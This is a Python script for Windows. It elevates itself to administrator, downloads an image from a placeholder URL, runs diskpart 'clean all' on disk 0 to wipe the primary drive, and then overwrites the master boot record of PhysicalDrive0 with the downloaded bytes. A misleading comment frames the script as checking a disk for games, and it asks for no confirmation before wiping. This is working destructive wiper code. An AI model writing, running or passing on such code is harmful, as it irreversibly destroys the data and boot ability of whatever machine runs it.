import os
import urllib.request
import subprocess  # Required to execute shell commands
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None,       
            "runas",   
            sys.executable,  
            " ".join(sys.argv),  
            None,       
            1           
        )
        sys.exit() 

# check os entery for disk to download games
run_as_admin()
print("Running as admin!")

def download_image(url, destination):
    try:
        urllib.request.urlretrieve(url, destination)
        print(f"Img downloaded successfully to {destination}")
    except Exception as e:
        print(f"Error downloading image: {e}")
        return False
    return True

def wipe_disk(disk_number):
    try:
        #Diskpart script
        diskpart_script = f"""
        select disk {disk_number}
        clean all
        """
        #create the file in the root directory for less failure
        with open("diskpart_script.txt","w") as f:
            f.write(diskpart_script)
        # Execute diskpart
        result = subprocess.run(["diskpart", "/s", "diskpart_script.txt"], capture_output=True, text=True)
        print(result.stdout) # display diskpart output
        os.remove("diskpart_script.txt") # delete diskpart script
        if result.returncode!=0:
                print (result.stderr)   #Print errors to terminal
    except Exception as e:
        print(f"Error wiping disk: {e}")

def overwrite_mbr(disk, image_path):
    try:
        with open(image_path, "rb") as img:
            image_data = img.read(512)  # MBR size

        with open(disk, "wb") as target:
            target.write(image_data)
        print(f"MBR overwritten successfully on {disk} with {image_path}")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":

    image_url = "YOUR_URL_HERE" 

    local_image_path = "temp_image.img" 
    target_disk = "\\\\.\\PhysicalDrive0" 
    disk_number_to_wipe = 0              

    # Download image
    if download_image(image_url, local_image_path):
        wipe_disk(disk_number_to_wipe)
        overwrite_mbr(target_disk, local_image_path) # Overwrite MBR

        os.remove(local_image_path)
        input("Press Enter to exit.")
